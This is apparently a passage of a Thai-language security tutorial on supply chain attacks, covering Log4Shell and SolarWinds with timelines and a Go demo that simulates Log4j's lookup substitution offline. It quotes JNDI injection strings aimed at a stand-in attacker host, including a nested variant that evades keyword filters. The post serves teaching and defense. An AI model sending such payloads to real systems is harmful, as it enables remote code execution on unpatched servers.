# Supply Chain Attack: Log4Shell + SolarWinds (2020–21) — เมื่อ "คนที่เราไว้ใจ" กลายเป็น attack surface (ตอนที่ 08)

> 📅 เขียนเมื่อ: 16 ตุลาคม 2026 (เวลาไทย, UTC+7)
> - **เครื่อง:** Raspberry Pi 5 (Linux 6.18.39+rpt-rpi-2712, aarch64)

ใน[ตอนที่ 07](/blog/post.html?slug=2026-10-15-software-security-07-heartbleed-2014) เราจบลงที่คำถามค้างคาที่สำคัญที่สุดของความปลอดภัยซอฟต์แวร์ยุคใหม่:

> *ถ้าโค้ดของเราปลอดภัยแล้ว — แต่โค้ดที่มัน **เรียกใช้** มีบั๊ก … ใครรับผิดชอบ?*

Heartbleed สอนเราว่า "โค้ดที่ทุกคนใช้" อาจมีบั๊กที่ไม่มีใครเห็น · แต่ Heartbleed ยังเป็นเรื่องของ **ผู้เขียน** library (OpenSSL) เอง · บทนี้พาเราไปอีกชั้นหนึ่งที่ลึกและน่ากลัวกว่า นั่นคือ layer ที่เราไม่ได้เขียนเอง ไม่ได้รีวิวเอง และในหลายกรณี **ไม่รู้ด้วยซ้ำว่ามันอยู่ตรงนั้น**

สองเหตุการณ์ห่างกันแค่ ~1 ปี ทำให้ทั้งอุตสาหกรรมต้องยอมรับความจริงนั้น — และเปลี่ยนคำว่า **supply chain** จากศัพท์เฉพาะในห้องประชุมความมั่นคง **กลายเป็นคำที่ผู้บริหารต้องรู้จัก**

## 1. แนวคิด: supply chain attack คืออะไรกันแน่

### 1.1 เริ่มจากคำที่เรารู้อยู่แล้ว — trust boundary

ตั้งแต่[ตอนที่ 01](/blog/post.html?slug=2026-10-09-software-security-01-why-security-matters) และ[ตอนที่ 04](/blog/post.html?slug=2026-10-12-software-security-04-sql-injection) เราพูดถึง **trust boundary** (เส้นแบ่งว่าอะไร "ข้างนอก" ที่เราไม่ไว้ใจ อะไร "ข้างใน" ที่เราไว้ใจ) ทุกครั้งที่เราจะใช้ข้อมูล เราต้องถามว่า *ข้อมูลนี้ผ่านขอบเขตความเชื่อถือมาแล้วหรือยัง*

แต่ trust boundary ที่เราวาดไว้ในหัวมักกว้างไม่พอ · เราชอบวาดแบบนี้:

```text
[ผู้ใช้] --ไม่ไว้ใจ--> [โค้ดของเรา] --ไว้ใจ--> [ทุกอย่างที่อยู่ข้างใน]
```

ทว่าในซอฟต์แวร์จริง ภาพมันเป็นแบบนี้:

```text
[ผู้ใช้] --ไม่ไว้ใจ--> [โค้ดของเรา] --?
                                          |-- [dependency ที่เราดึงมา]        (โค้ดที่เราไม่ได้เขียน)
                                          |-- [dependency ของ dependency]     (โค้ดที่เราไม่รู้ว่ามี)
                                          |-- [compiler / build tool]         (โปรแกรมที่เรารันบนเครื่อง build)
                                          |-- [CI/CD pipeline]                (เครื่องที่ประกอบทุกอย่าง)
                                          |-- [registry ที่เราดาวน์โหลดของ]   (คนกลางที่เราฝากไฟล์ไว้)
```

ในแผนภาพนี้ **CI/CD** (Continuous Integration / Continuous Delivery = สายงานอัตโนมัติที่รับโค้ดใหม่ไปทดสอบ แล้วปล่อยของขึ้นระบบ) คือกล่องที่เราไว้ใจที่สุดกล่องหนึ่ง — เพราะมันมีสิทธิ์ประกอบและปล่อยทุกอย่างในนามของเรา

**supply chain attack** คือการโจมตี "?" ในแผนภาพข้างบน — โจมตี **คนหรือของที่เราไว้ใจ** แทนที่จะเจาะตัวเราโดยตรง

และนี่คือหัวใจของทั้งบท: **attack surface** (พื้นที่ผิวที่โจมตีได้ = ทุกจุดที่ผู้โจมตีเข้าถึงได้จากภายนอก) — **ไม่ได้อยู่ในโค้ดที่เราเขียนเท่านั้น แต่มันคือทุกอย่างที่โค้ดของเราไปพึ่ง·ทุกอย่างที่ถูกเรียกในตอน build · และทุกอย่างที่ไหลผ่านมือคนที่เราเชื่อ**

### 1.2 สามตำแหน่งที่ supply chain ถูกโจมตี

ก่อนไปดูเหตุการณ์จริง แยกให้ชัดว่ามันมีสาม "ตำแหน่ง" ที่ต่างกันโดยสิ้นเชิง — เพราะสองเหตุการณ์ในบทนี้อยู่คนละตำแหน่ง และ**แก้ไม่เหมือนกัน**

| ตำแหน่งที่ถูกโจมตี | โจมตีอะไร | ใครเป็นเจ้าของการแก้ | ตัวอย่าง |
|---|---|---|---|
| **dependency ที่เราเลือก** | โค้ด third-party (ของคนอื่นที่เราไม่ได้เขียนเอง) ที่เราดึงเข้ามา | **เรา** (อัปเกรด / ปิดฟีเจอร์ / allowlist (รายการที่อนุญาต)) | Log4Shell (2021) |
| **build pipeline ของผู้ขาย** | เครื่องที่ผู้ขายใช้คอมไพล์ส่งมาให้เรา | **ผู้ขาย** (เราตรวจได้จำกัด) | SolarWinds (2020) |
| **toolchain / registry** | compiler, build tool, ที่ฝากแพ็กเกจ | ผสมกัน | (เหตุการณ์อื่นในอนาคต) |

**Log4Shell** อยู่แถวแรก: ผู้โจมตีไม่ต้องเจาะบริษัทไหนเลย · เขาแค่ **ฝากของดี ๆ ไว้ที่ปลายทางที่ library จะไปเรียก** แล้วรอให้เหยื่อเป็นคนกดปุ่ม

**SolarWinds** อยู่แถวสอง: ผู้โจมตีไม่ต้องเจาะบริษัทไหนเลยเช่นกัน · เขาแค่ **เข้าไปนั่งอยู่ในเครื่อง build ของผู้ขาย** แล้วปล่อยให้ผู้ขายเป็นคนเซ็นชื่อและส่งของมาให้เหยื่อทุกคนพร้อมกัน

บทนี้จะพาไปดูทั้งสอง แล้วพิสูจน์ว่าความต่างนี้ **เปลี่ยนวิธีป้องกันทั้งหมด**

## 2. ทำไมสำคัญ: สองเหตุการณ์ที่เปลี่ยนวงการ

### 2.1 Log4Shell (CVE-2021-44228) — library ที่ทุกคนใส่ แต่ไม่มีใครอ่าน

เริ่มจากของที่เราคุ้นเคย เพราะ[ตอนที่ 03](/blog/post.html?slug=2026-10-11-software-security-03-smashing-the-stack)–[07](/blog/post.html?slug=2026-10-15-software-security-07-heartbleed-2014) ล้วนพูดถึง "โปรแกรมที่เราเขียน" แต่ครั้งนี้เป็น **โปรแกรมที่คนอื่นเขียนและทุกคนเอาไปใส่**

**CVE** (Common Vulnerabilities and Exposures) คือรหัสอ้างอิงกลางของช่องโหว่ที่รู้จักในแต่ละรายการ — รูปแบบ `CVE-ปี-ตัวเลข` ทำให้ทุกฝ่ายพูดถึงช่องโหว่เดียวกันได้ตรงกัน

**Log4j 2** คือ library สำหรับ "บันทึก log" ของภาษา Java · แทบทุกโปรแกรม Java ต้อง log (ใครทำอะไร เมื่อไร พังตรงไหน) · การนับ log เบา ๆ เองทุกที่ในโค้ดเป็นเรื่องน่ารำคาญ · ดังนั้นแทบทุกโปรเจกต์ Java จึงใส่ Log4j 2 ลงไป — **บ่อยครั้งโดยไม่รู้ตัว** เพราะมันตามมาเองในฐานะ dependency ของ dependency (เราจะเห็นกลไกนี้ชัด ๆ ในเดโม 2)

และ Log4j 2 มีฟีเจอร์ที่ดูมีประโยชน์มาก: **message lookup substitution** — ในข้อความ log เราสามารถเขียน `${...}` แล้วให้ตัวจัดรูปแบบแทนที่ด้วยค่าจริง เช่น `${env:USER}` → ชื่อผู้ใช้ปัจจุบัน · `${date:yyyy-MM-dd}` → วันที่วันนี้

จำภาพนี้ไว้: **ข้อความ log ถูก "ตีความ" ไม่ใช่แค่ถูกเก็บ** — เหมือนกับที่เราพูดใน[ตอนที่ 04](/blog/post.html?slug=2026-10-12-software-security-04-sql-injection) ว่า *อย่าเอาข้อมูลไปเป็นคำสั่ง* · ครั้งนี้คำสั่งอยู่ใน **ข้อความ log**

หนึ่งใน **resolver** (ตัวที่ไปหาค่าจริงมาแทนที่ `${...}`) ที่ Log4j 2 มีให้คือ **JNDI** (Java Naming and Directory Interface — ระบบ "ค้นหาของตามชื่อ" ของ Java ที่ใช้คุยกับบริการภายนอก) → เขียนได้ว่า `${jndi:ldap://host/path}` แปลว่า *"ไปถาม LDAP server ที่ host แล้วเอาสิ่งที่มันตอบมาใช้"* · โดย **LDAP** = โปรโตคอลบริการไดเรกทอรีที่เก็บข้อมูลเป็นรายการและเปิดให้ค้นจากที่อื่นได้ และ **RMI** = กลไกเรียกเมธอดของออบเจกต์ Java ที่อยู่คนละโปรเซส (คนละเครื่อง)

ผู้เขียน feature มองว่า "ผู้ใช้จะอยาก log ค่าจาก LDAP จริง ๆ ก็ได้นะ เป็นฟีเจอร์ที่มีประโยชน์" — **แล้วก็ไม่ผิดในเชิงฟีเจอร์** ปัญหาคือคำถามว่า **ข้อความ log นั้น ใครเป็นคนใส่ `${...}` เข้ามา?**

คำตอบคือ: **ผู้ใช้ที่โจมตีได้** — เพราะแอปส่วนใหญ่ log ข้อมูลที่มาจากผู้ใช้ทั้งนั้น (ชื่อผู้ใช้ที่กรอกผิด, User-Agent ที่เบราว์เซอร์ส่งมา, คำค้นหา, header ต่าง ๆ)

**กลไกที่เกิดขึ้น:**
1. ผู้โจมตีส่งข้อมูลที่ฝังสตริง `${jndi:ldap://attacker.example/a}` เข้า header หรือช่องกรอกของแอป
2. แอป (ที่เชื่อถือข้อมูลของตัวเอง) **บันทึกข้อความนั้นลง log**
3. Log4j เห็น `${jndi:...}` แล้วตีความเป็น lookup
4. มันไปถาม LDAP server ของผู้โจมตี — ซึ่งตอบกลับด้วย **Java class ที่จะถูกโหลดและถูกเรียก constructor**
5. แอปเรียกโค้ดนั้น → **remote code execution (RCE)** = การที่ผู้โจมตีสั่งให้เครื่องเหยื่อรันโค้ดของตัวเองได้

สิ่งที่ทำให้มันถูกเรียกอย่างถูกต้องว่าเป็นภัยระดับ "ทั้งอุตสาหกรรม":

- **CVSS 10.0** (Common Vulnerability Scoring System = ระบบให้คะแนนความรุนแรงของช่องโหว่) — คะแนนสูงสุด · เวกเตอร์จริงของ CVE นี้คือ `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` อ่านทีละท่อนได้:
  - `AV:N` — Network: เจาะได้จากระยะไกลผ่านเครือข่าย
  - `AC:L` — Attack Complexity ต่ำ: โจมตีไม่ต้องมีเงื่อนไขพิเศษใด ๆ
  - `PR:N` — ไม่ต้องมีสิทธิ์หรือ login ก่อน
  - `UI:N` — เหยื่อไม่ต้องคลิกหรือทำอะไรเลย (User Interaction = None)
  - `S:C` — Scope Changed: กระทบข้ามขอบเขต ออกจากตัว component ที่มีช่องโหว่ไปยังส่วนอื่น — ท่อนนี้คือตัวที่ทำให้แตะ 10.0
  - `C:H` `I:H` `A:H` — สูงสุดทั้ง **CIA triad**: confidentiality (ความลับ) · integrity (ความถูกต้องของข้อมูล) · availability (ความพร้อมใช้งาน)
- **แก้ที่ปลายทางไม่ได้** — ผู้โจมตีไม่ต้องทำอะไรเลยนอกจากเปิด LDAP server ของตัวเอง · **เหยื่อเป็นคนกดปุ่ม**
- **ตำแหน่งในโค้ดไม่สำคัญ** — library อยู่ลึกแค่ไหนก็ยังถูกเรียกอยู่ดี
- **อายุของบั๊ก** — mechanism นี้อยู่มานานโดยไม่มีใครรู้ เพราะมันไม่เคยถูกใช้เป็นช่องโจมตี · คำถามว่า *"โค้ดนี้มีบั๊กไหม"* กับ *"โค้ดนี้ใช้ประโยชน์จากช่องโจมตีได้ไหม"* เป็นคำถามคนละข้อ

**ไทม์ไลน์ (ตรวจจากแหล่งปัจจุบัน):**

- **24 พฤศจิกายน 2021** — **Chen Zhaojun** จากทีมความปลอดภัยของ **Alibaba Cloud** รายงานต่อ Apache Software Foundation แบบส่วนตัว
- **6 ธันวาคม 2021** — ออก `2.15.0-rc1` (มี fix ล่วงหน้า 3 วันก่อนเปิดเผย)
- **9–10 ธันวาคม 2021** — เปิดเผยต่อสาธารณะพร้อมกัน (CVE-2021-44228) → เกิดเหตุที่หลายคนเรียกว่า "สุดสัปดาห์ที่ยาวที่สุดในวงการความปลอดภัย"
- **10 ธันวาคม 2021** — `2.15.0` ออก (จำกัด lookup)
- **14 ธันวาคม 2021** — `2.16.0` ออก — **ปิด message lookup และปิด JNDI by default** เพราะพบว่า 2.15.0 แก้ไม่ครบ (มี CVE-2021-45046)
- **18 ธันวาคม 2021** — `2.17.0` — แก้ DoS CVE-2021-45105
- **28–29 ธันวาคม 2021** (28 ธ.ค. ตามเวลา UTC · 29 ธ.ค. ตามเวลาไทย) — `2.17.1` — แก้ CVE-2021-44832 → **รุ่นที่ถือว่าปลอดภัยจริงสำหรับ Java 8+** · ส่วน Java 7 ใช้ `2.12.4` และ Java 6 ใช้ `2.3.2` เพราะรุ่น 2.17.x บิลด์ด้วย Java 8 ขึ้นไป จึงรันบน Java รุ่นเก่าไม่ได้ — สาย 2.12.x และ 2.3.x เป็นรุ่นที่แพตช์เฉพาะจุดแล้วเพื่อให้ยังรันบน Java เก่าได้ · **ยืนยันรุ่นที่แก้ของ CVE-2021-44832** (บันทึก CVE ของ Apache ระบุ 2.17.1 · 2.12.4 · 2.3.2) — <https://cve.org/CVERecord?id=CVE-2021-44832>

นี่คือบทเรียนเชิงปฏิบัติที่สำคัญมากของ Log4Shell: **"อัปเดตเป็นเวอร์ชันที่ใหม่กว่าก็ปลอดภัย" ไม่จริง** · 2.15.0 ใหม่กว่า 2.14.1 แต่ยังไม่ปลอดภัย · และในตอนนั้นคนจำนวนมากอ่านว่า "อัปเป็น 2.15.0 แล้วจบ" — ซึ่งเป็นความเข้าใจผิดที่ส่งผลจริงในเหตุการณ์นี้

**ผลกระทบ:** มีรายงานการใช้งานในบริการขนาดใหญ่อย่าง AWS, Cloudflare, iCloud, Minecraft: Java Edition, Steam และ Tencent QQ · หน่วยงานรัฐบาลสหรัฐและหน่วยงานด้านความมั่นคงทางไซเบอร์อื่น ๆ ออกคำเตือนภัย — **CISA** (Cybersecurity and Infrastructure Security Agency = หน่วยงานความมั่นคงไซเบอร์ของสหรัฐ) · และ **WAF** (Web Application Firewall = ตัวกรองที่ดักคำขอ HTTP ก่อนถึงแอป) ทั่วโลกถูกอัปเดตกฎเพื่อกันสตริง `${jndi:` ทันทีในคืนนั้น

**บทเรียนที่โลกเรียนรู้:** *library ที่ทุกคนใส่เข้ามา ย่อมเป็น attack surface ที่ไม่มีใครอ่าน* — เราใช้มันเพราะทุกคนใช้ · แต่สำหรับผู้โจมตี นั่นแปลว่า "เขียนครั้งเดียว ยิงได้ทุกคน"

### 2.2 SolarWinds / SUNBURST (2020) — โจมตี build pipeline ต้นน้ำ

ต่างจาก Log4Shell คนละโลกเลย

**SolarWinds** เป็นบริษัทที่ขายซอฟต์แวร์ชื่อ **Orion** ให้องค์กรและหน่วยงานรัฐใช้ **ตรวจสอบโครงสร้างพื้นฐานไอที** (server, network device, database) · Orion ถูกติดตั้งไว้กับสิ่งที่สำคัญที่สุดขององค์กร และเพราะหน้าที่ของมันคือเฝ้าและจัดการระบบอื่น มันจึงทำงานด้วยสิทธิ์สูงและถูก "เชื่อถือ" โดยระบบที่เหลือ

**เหตุการณ์ที่เกิดขึ้น (ตรวจจากแหล่งปัจจุบัน):**

- **กันยายน 2019** — ผู้โจมตีเข้าถึงเครือข่ายของ SolarWinds
- **ตุลาคม 2019** — ทดลองแทรกโค้ดเข้า build ของ Orion (ทดสอบก่อนลงมือจริง)
- **มีนาคม–พฤษภาคม 2020** — **บิลด์ที่ถูกแทรกโค้ดถูกเซ็นด้วยใบรับรองของ SolarWinds เอง และโพสต์ลงเว็บอัปเดตตามปกติ**
- **มีนาคม–มิถุนายน 2020** — ลูกค้าดาวน์โหลดอัปเดตนั้นผ่านกลไก update ปกติ
- **ธันวาคม 2020** — **FireEye** (บริษัทความปลอดภัยที่ถูกเจาะด้วย) สืบจนพบและเปิดเผย · SolarWinds แจ้งลูกค้า **~33,000 ราย** และประเมินว่ามี **น้อยกว่า 18,000 ราย** ที่ติดตั้งบิลด์ที่มี **backdoor** (ช่องทางลับที่ผู้โจมตีเข้าใช้ได้โดยไม่ต้องงัดช่องโหว่ใด ๆ)
- **13 ธันวาคม 2020** — เปิดเผยต่อสาธารณะ · CISA ออก **Emergency Directive 21-01** สั่งหน่วยงานรัฐบาลกลางสหรัฐ **ถอด Orion ออกจากเครือข่ายทันที** เพราะตอนนั้นยังไม่มี patch

**กลไก:** โค้ดของมันถูกฝังใน `SolarWinds.Orion.Core.BusinessLayer.dll` — **DLL** (Dynamic Link Library = ไฟล์โค้ดที่โปรแกรมบน Windows โหลดไปใช้ตอนรัน) **ที่มีลายเซ็นดิจิทัลของ SolarWinds ถูกต้อง** · จึงผ่านการตรวจสอบของทุกเครื่องมือที่ตรวจ code-signing ด้วยเหตุผลที่ถูกต้อง: **ในทางเทคนิคแล้ว SolarWinds เป็นคนเซ็นมันเองจริง ๆ**

และที่น่ากลัวที่สุดคือ **วิธีที่มันเข้าไป** — ไม่ใช่การ commit โค้ดหลบสายตา แต่เป็นการใช้เครื่องมือชื่อ **SUNSPOT** ที่ **แทรกโค้ดลงในขั้นตอนคอมไพล์** — โดยรอให้มีงาน build ของ Orion กำลังทำงาน แล้วสลับไฟล์ซอร์สตัวหนึ่งก่อน compiler จะอ่าน · ทำให้ **โค้ดใน repository ยังสะอาดอยู่เสมอ** และ code review เห็นแต่โค้ดที่ถูกต้อง

**ผลลัพธ์:** มีรายงานหน่วยงานรัฐบาลกลางสหรัฐอย่างน้อย **9 แห่ง** ที่ถูกเจาะ (กระทรวงการคลัง พาณิชย์ ต่างประเทศ พลังงาน ความมั่นคงภายใน และยุติธรรม) · และบริษัทเอกชนอย่าง Microsoft, FireEye, Cisco, Intel, Nvidia, VMware · แต่องค์กรที่ถูก "ลงมือเจาะต่อ" จริง ๆ มีจำนวน **น้อยกว่า 100** — ตัวเลขนี้มีสองแหล่งที่ตรวจสอบได้: ทำเนียบขาว (แถลงข่าว 17 กุมภาพันธ์ 2021 โดย Anne Neuberger) ระบุว่า *"9 federal agencies and about 100 private sector companies were compromised"* — <https://www.whitehouse.gov/briefing-room/press-briefings/2021/02/17/press-briefing-by-press-secretary-jen-psaki-and-deputy-national-security-advisor-for-cyber-and-emerging-technology-anne-neuberger-february-17-2021> · และ SolarWinds เองระบุในรายงานต่อ ก.ล.ต. สหรัฐ (8-K, 7 พฤษภาคม 2021) ว่า *"fewer than 100 customers"* — <https://www.sec.gov/Archives/edgar/data/1739942/000173994221000076/swi-20210507.htm> · **สองตัวเลขนี้คนละฐานการนับ** — ทำเนียบข่าวนับ *เหยื่อทั้งหมดที่ถูกเจาะ* (9 หน่วยงานรัฐ + ราว 100 บริษัทเอกชน ≈ 109 องค์กร) ส่วน SolarWinds นับเฉพาะ *ลูกค้าที่เครื่องของตนติดต่อกับเซิร์ฟเวอร์ของผู้โจมตีจริง* จึงเป็น "น้อยกว่า 100 ราย" · และแนวโน้มชี้ว่าเป็นการจารกรรม (espionage) โดย **APT** (Advanced Persistent Threat = กลุ่มโจมตีที่ได้รับการสนับสนุนจากรัฐ มีทรัพยากรสูง และซ่อนตัวอยู่ได้ยาวนาน) ชื่อ **APT29** ซึ่งเชื่อมโยงกับหน่วยข่าวกรองต่างประเทศของรัสเซีย (SVR)

จุดที่ต้องเข้าใจ: **มันไม่ได้ถูกแก้ด้วยการ "อัปเดตเป็นเวอร์ชันที่ใหม่กว่า"** · ในเมื่อลายเซ็นถูกต้องและ mechanism ที่พามันมา (auto-update) ก็คือ mechanism ที่เราสอนให้ระบบเราต้องรับ ของที่ส่งมาเลย "ถูกต้องตามกฎทุกข้อ" · ทางแก้ที่มีคือ: **ตรวจ provenance** (ที่มา) และ **harden CI/CD** ให้ build pipeline เองเป็นเป้าที่ยาก

### 2.3 สองเหตุการณ์นี้ต่างกันตรงไหน (และเหมือนตรงไหน)

![เปรียบเทียบ Log4Shell กับ SolarWinds: dependency ที่เราเลือก vs build pipeline ที่เราไว้ใจ](/assets/diagrams/ep08-02-log4shell-vs-solarwinds.svg)

ในตารางนี้ **artifact** = ไฟล์ที่บิลด์ออกมาแล้ว (ไบนารี แพ็กเกจ หรือตัวติดตั้ง) ที่ส่งมอบให้กัน · **ท้ายน้ำ** (downstream) = ปลายทางที่ของไหลมาถึงเรา · **ต้นน้ำ** (upstream) = ต้นทางที่ของถูกสร้างและส่งต่อออกมา

| ประเด็น | Log4Shell (2021) | SolarWinds (2020) |
|---|---|---|
| ตำแหน่งที่โจมตี | dependency ท้ายน้ำ (ที่เราเลือก) | build pipeline ต้นน้ำ (ของผู้ขาย) |
| ผู้โจมตีทำอะไร | ฝาก Java class ไว้ที่ LDAP server ของตัวเอง | เข้าเครื่อง build ของผู้ขาย แทรกโค้ดก่อนคอมไพล์ |
| ลายเซ็นของ artifact | ไม่ได้เกี่ยวข้อง | **ถูกต้อง 100%** (ผู้ขายเซ็นเอง) |
| ใครรู้ตัวว่ามีของอยู่ในระบบ | ไม่รู้ (ตาม dependency) | ไม่รู้ (มันคืออัปเดตปกติ) |
| ต้องแจกจ่ายกี่ครั้ง | เขียน exploit (โค้ดที่ใช้ประโยชน์จากช่องโหว่) ได้เอง ไม่ต้องแจก | จำกัดจำนวน: ส่ง 18,000 รายพร้อมกัน |
| ทางแก้ที่ "เรา" ทำได้เอง | **ทำได้เต็มที่** (อัปเกรด / allowlist / ปิด lookup) | **จำกัด** (ต้องพึ่งผู้ขาย + ตรวจนอกทาง) |

แต่สิ่งที่ **เหมือนกัน** และเป็นหัวใจของทั้งบท:

> ทั้งสองเหตุการณ์ไม่มีผู้โจมตีคนไหน "เจาะบริษัทเหยื่อ" เลย — พวกเขาโจมตี **คนที่เหยื่อไว้ใจ** แล้วปล่อยให้เหยื่อเป็นคนพาเข้าบ้านเอง

และนี่คือการเปลี่ยนวิธีคิดที่สำคัญ: **attack surface ของเราไม่ได้อยู่แค่ในโค้ดของเรา** — มันรวมทุก dependency, ทุก toolchain และทุก build pipeline ที่เราไว้ใจ · ถ้าเราไม่รู้ว่ามีอะไรอยู่ในระบบของเรา เราก็ป้องกันมันไม่ได้

### 2.4 ผลลัพธ์ที่จับต้องได้: SBOM, dependency scanning, signed artifact

สองเหตุการณ์นี้ไม่ได้จบที่การแพตช์ · มันเปลี่ยน **นโยบายและเครื่องมือ** ของทั้งอุตสาหกรรม:

- **SBOM (Software Bill of Materials)** — "ใบแสดงส่วนประกอบ" ของซอฟต์แวร์
  - รู้ว่าซอฟต์แวร์ของเราประกอบด้วย component อะไรบ้าง เวอร์ชันไหน และตัวไหนถูกดึงต่อ (transitive)
  - **12 พฤษภาคม 2021** — **Executive Order 14028** ("Improving the Nation's Cybersecurity") สั่งให้กระทรวงพาณิชย์สหรัฐฯ ร่วมกับ **NTIA** (National Telecommunications and Information Administration — หน่วยงานในกระทรวงพาณิชย์สหรัฐ) ประกาศ "minimum elements" ของ SBOM
  - **12 กรกฎาคม 2021** — NTIA ตีพิมพ์เอกสาร *The Minimum Elements For a Software Bill of Materials* โดยข้อมูลขั้นต่ำมี 3 กลุ่ม:
    - **Data Fields** — ชื่อผู้จัดหา · ชื่อ component · เวอร์ชัน · ตัวระบุ · ความสัมพันธ์แบบ dependency · ผู้จัดทำ · เวลา
    - **Automation Support** — ทำให้เครื่องอ่านและตรวจได้อัตโนมัติ ไม่ต้องนั่งเปิดเอกสารอ่าน
    - **Practices and Processes** — ขั้นตอนที่ทำให้ SBOM ถูกสร้างจริงและถูกดูแลต่อ ไม่ใช่ทำครั้งเดียวแล้วทิ้ง
  - หลังจากนั้นทุกองค์กรต้องตอบได้ว่า *"คุณใช้ระบบอะไรอยู่ และมี component อะไรในนั้น"* — คำถามที่ก่อนปี 2020 หลายที่ตอบไม่ได้
- **Dependency scanning** — เครื่องมือที่เทียบ dependency ของเรากับฐานข้อมูลช่องโหว่โดยอัตโนมัติ: **govulncheck** ของ Go, **Dependabot** ของ GitHub, และ **OSV** (Open Source Vulnerabilities) ที่เป็นฐานข้อมูลกลางที่ทุกเครื่องมือดึงข้อมูลจากที่เดียว
- **Signed artifact + provenance** — ไม่ใช่แค่ "เซ็นว่าใครสร้าง" แต่ต้องพิสูจน์ **"สร้างอย่างไร"** ด้วย
  - กรอบงานที่ใช้กันคือ **SLSA (Supply-chain Levels for Software Artifacts)** ที่แบ่งระดับความเชื่อมั่นของ "ที่มา" ของ artifact
  - และ **Sigstore/cosign** ที่ทำให้การเซ็นเป็นเรื่องง่าย — ใช้ **OIDC** (OpenID Connect = ยืนยันตัวตนผ่านผู้ให้บริการ identity ที่มีอยู่แล้ว) แทนคีย์ถาวรที่ต้องเก็บและหมุนเวียนเอง
  - การตรวจแบบนี้ทำ **provenance** (เอกสารที่มาของบิลด์) ให้เป็นสิ่งที่ตรวจสอบได้ ไม่ใช่แค่เชื่อคำพูด
- **Pinning version + lockfile** — ล็อกเวอร์ชันให้แน่นอน ไม่ปล่อยให้ dependency "ตามมาเอง" แบบเงียบ ๆ

เราไม่สามารถยืนยัน claim เหล่านี้ได้ด้วยการอ่านเท่านั้น — เราต้อง **รันมันจริง** และดูว่าแต่ละมาตรการกันอะไรได้/กันอะไรไม่ได้

## 3. ลงมือทำ: สร้าง เห็นช่องโหว่ แล้วปิดมัน

เราจะทำสามเดโมเรียงกัน แต่ละเดโมตอบคำถามหนึ่งข้อ:

1. **เดโม 1 (subst)** — "mechanism ของ Log4Shell หน้าตาเป็นอย่างไร และทำไมการแบนคำไม่พอ?" → ตัว substitution engine เล็ก ๆ ที่จำลอง `StrSubstitutor` ของ Log4j2
2. **เดโม 2 (deps)** — "dependency ที่เราไม่รู้ว่าอยู่ในระบบ ตรวจโดยอัตโนมัติได้อย่างไร?" → dependency scanner + SBOM ที่ทำงานแบบออฟไลน์
3. **เดโม 3 (artifact)** — "ถ้าลายเซ็นยังใช้ไม่ได้ แล้วอะไรจับ build server ที่ถูกยึดได้?" → signed artifact + **reproducible build** (บิลด์ซ้ำจาก source เดิมแล้วได้ไบต์และ hash เดิมทุกครั้ง)
4. **(หัวข้อ 3.4)** ประกอบทั้งสามเดโมเป็นตาราง "ชั้นป้องกัน" — แต่ละชั้นจับภัยคนละแบบ
5. **(หัวข้อ 3.5)** รันทุกอย่างซ้ำได้ในคำสั่งเดียว พร้อมตัวตรวจว่าบทกับผลรันตรงกัน

ทุกอย่างอยู่ใน `security/code/ep08/` และรันซ้ำได้ผลเดิมทุกครั้งด้วย `bash run_all.sh`

### 3.1 เดโม 1: substitution engine — "${...}" ที่มาจากผู้ใช้ = คำสั่ง

เราจะสร้าง engine เล็ก ๆ ที่ทำงานเหมือน `StrSubstitutor` ของ Log4j2: หา `${prefix:key}` แล้วแทนด้วยค่าจาก resolver ที่ลงทะเบียนไว้ · resolver หนึ่งตัวชื่อ `ldap` ที่ **จำลอง JNDI → LDAP** — ไม่ไปที่ไหนจริง แต่ **นับจำนวนครั้งที่ "โค้ดจากระยะไกลถูกสั่งให้ทำงาน"**

```go
	// --- resolver ที่เป็นหัวใจของช่องโหว่: JNDI → LDAP (จำลอง ไม่ต่อเครือข่าย) ---
	// ใน Log4j จริง บรรทัดนี้จะไปดึง Java class จาก LDAP/RMI server ของผู้โจมตี
	// แล้วโหลด/เรียก constructor ของมัน = remote code execution
	e.resolvers["ldap"] = func(key string) (string, bool) {
		e.LookupsInvoked++
		e.RemoteCodeRun++
		e.Trace = append(e.Trace, "jndi->ldap "+key)
		return "[REMOTE-CLASS-EXECUTED:" + key + "]", true
	}
```

หัวใจที่ทำให้มันเป็นช่องโหว่ไม่ใช่ตัว resolver — แต่คือ **ตัวขยาย `${...}` ที่รองรับการซ้อนกัน** (นี่คือสิ่งที่ทำให้ bypass ตัวกรองได้):

```go
			if j < len(s) {
				inner := s[i+2 : j]
				// ขยายของข้างในก่อน → ${${lower:l}dap://...} กลายเป็น ${ldap://...}
				// นี่คือบรรทัดที่ทำให้ตัวกรองที่ไล่แบนคำแบบตรง ๆ ถูกข้ามได้
				inner = e.expand(inner, depth+1)
				prefix, key, ok := cutPrefix(inner)
				if ok {
					if repl, ran := e.lookup(prefix, key); ran {
						b.WriteString(repl)
						i = j + 1 // ขยายสำเร็จ → ข้ามทั้งก้อน ${...} ที่เพิ่งแทนไป
						continue
					}
				}
				b.WriteString(s[i : j+1]) // ไม่ได้ขยาย → คงรูปเดิมไว้ทั้งก้อน
				i = j + 1                 // เดินหน้าต่อจากหลัง '}' (กันวนซ้ำที่เดิม)
				continue
			}
```

และชั้นที่ "ควรมี" คือ **allowlist** (รายการที่อนุญาต — ทำงานเฉพาะค่าที่อยู่ในลิสต์ ที่เหลือนอกลิสต์ไม่ทำงาน) **ของ prefix** — ไม่ใช่การแบนคำ:

```go
// lookup = ตัดสินใจว่าจะยอมให้ prefix นี้ทำงานหรือไม่ (ชั้นที่ควรมี "allowlist")
func (e *Engine) lookup(prefix, key string) (string, bool) {
	if !e.cfg.LookupsOnMessage {
		return "", false // เทียบ log4j2.formatMsgNoLookups=true
	}
	if e.cfg.AllowPrefixes != nil && !e.cfg.AllowPrefixes[prefix] {
		return "", false // allowlist: prefix นอกลิสต์ไม่ทำงาน
	}
	r, ok := e.resolvers[prefix]
	if !ok {
		return "", false
	}
	return r(key)
}
```

ทีนี้ส่งข้อความ log 4 แบบเข้า engine 5 นโยบาย แล้วดูว่า "โค้ดจากระยะไกลถูกสั่งทำงาน" กี่ครั้ง · payload ทั้ง 4 แบบคือคอลัมน์ A–D ในตาราง:

- **A** — ข้อความ log ปกติ ไม่มี `${...}` อยู่เลย
- **B** — `${ldap://attacker.example/a}` เขียนตรง ๆ (คำว่า `ldap:` ปรากฏชัดในข้อความดิบ)
- **C** — `${${lower:l}dap://attacker.example/a}` ซ้อนหนึ่งชั้น — ประกอบคำ `ldap` ขึ้นมาใหม่จาก `${lower:l}` ต่อกับ `dap`
